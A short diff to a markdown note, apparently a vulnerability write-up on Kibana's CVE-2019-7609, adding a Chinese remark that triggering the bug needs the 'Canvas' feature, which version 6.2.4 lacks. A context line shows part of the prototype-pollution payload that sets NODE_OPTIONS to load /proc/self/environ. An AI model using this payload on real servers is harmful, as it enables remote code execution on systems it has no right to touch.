@@ -56,5 +56,8 @@ server.host
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
 
+
+但是漏洞触发，还需要点击"Canvas"。但是某些版本，比如6.2.4并没有"Canvas"功能。
+
 ## Ref
 - https://github.com/mpgn/CVE-2019-7609
